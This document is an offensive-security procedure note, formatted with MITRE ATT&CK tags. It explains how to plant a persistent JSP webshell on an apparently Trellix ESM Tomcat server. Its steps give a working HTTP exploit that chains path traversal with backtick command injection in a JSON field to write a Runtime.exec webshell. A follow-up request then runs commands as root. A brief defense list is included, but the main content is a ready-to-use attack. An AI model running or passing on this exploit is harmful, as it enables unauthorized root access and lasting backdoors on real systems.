---
id: proc-trellix-webshell-5
tags:
  - webshell
  - persistence
  - rce
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
commands:
  - '[[commands/echo-jsp-webshell]]'
  - '[[commands/id-check-privs]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
  - '[[Web Shell]]'
updated_at: '2025-12-14T17:26:26.995Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Web Shell]]'
---
# Deploy-JSP-Webshell-for-Persistent-Access

## Summary

This procedure injects a JSP webshell into the Tomcat webapps directory using command injection, providing persistent RCE via parameter-based command execution even if direct shells are blocked.

## Description

The echo command writes JSP code to /etc/tomcat/webapps/ROOT/shell.jsp, which executes Runtime.exec on 'cmd' parameter. Accessible via traversal as /rs/..;/shell.jsp?cmd=<command>.

## Requirements

1. RCE via command injection established
2. Tomcat running with writable webapps/ROOT
3. [[tools/Burp-Suite]] for follow-up GET requests

## Defense

Defensive measures and detection strategies:

- Restrict write access to webapps directories
- Scan for anomalous JSP files with exec patterns
- Monitor file creation in Tomcat paths and block suspicious uploads

## Objectives

1. Deploy persistent backdoor
2. Enable command execution post-exploitation
3. Maintain access despite network restrictions

## Instructions

### Step 1: Inject Webshell Write Command

**Context**: Use echo to create the JSP file with command execution logic.

**Command** ([[commands/echo-jsp-webshell]]):

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.1
Host: target-esm.com
Content-Type: application/json

{"serverName":"test132","processes":[{"name":"`echo '<% if (request.getParameter(\"cmd\") != null) { Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); java.io.InputStream in = p.getInputStream(); int a = -1; while ((a = in.read()) != -1) out.print((char)a); } %>' > /etc/tomcat/webapps/ROOT/shell.jsp`","signal":"Restart"}]}
```

> Expected output: File created; verify by accessing it.

### Step 2: Test Webshell Execution

**Context**: Send GET with cmd parameter to run id.

**Command** ([[commands/id-check-privs]]):

```http
GET /rs/..;/shell.jsp?cmd=id HTTP/1.1
Host: target-esm.com
```

> Expected output: uid=0(root) gid=0(root) groups=0(root).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Persistence]] Persistence

### Techniques

- [[Unix Shell]] Unix Shell
- [[Web Shell]] Web Shell

### Sub-Techniques


## Commands Used

- [[commands/echo-jsp-webshell]]
- [[commands/id-check-privs]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- webshell
- jsp
